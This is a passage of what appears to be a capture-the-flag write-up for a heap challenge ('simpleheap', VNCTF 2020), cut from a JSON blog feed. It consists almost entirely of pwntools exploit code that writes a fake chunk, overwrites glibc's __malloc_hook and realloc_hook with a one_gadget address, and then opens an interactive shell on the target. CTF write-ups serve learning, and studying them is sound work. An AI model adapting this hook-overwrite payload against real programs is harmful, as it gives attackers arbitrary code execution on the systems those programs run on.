realloc_hook_1 = libc_base + 0x846CC print(&quot;we change the '__malloc_hook' '__libc_realloc'(it will be call realloc_hook!!!) , 'realloc_hook' change to one_gadget !!!!&quot;) print(&quot;'realloc_hook' in '__malloc_hook'-0x8 !!!!!!!! &quot;) payload = b'A' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc_hook) + b'\\n' add(0x60,'A') #index 2 which fd pointer point fake chunk add(0x60,payload) #index fake chunk print(&quot;============================== 4: one_gadget ===========================&quot;) sh.sendline('1') sh.sendline('32') sh.interactive() ","link":"https://l3mon629.github.io/post/vandn2020-gong-kai-sai-simpleheap/"}]}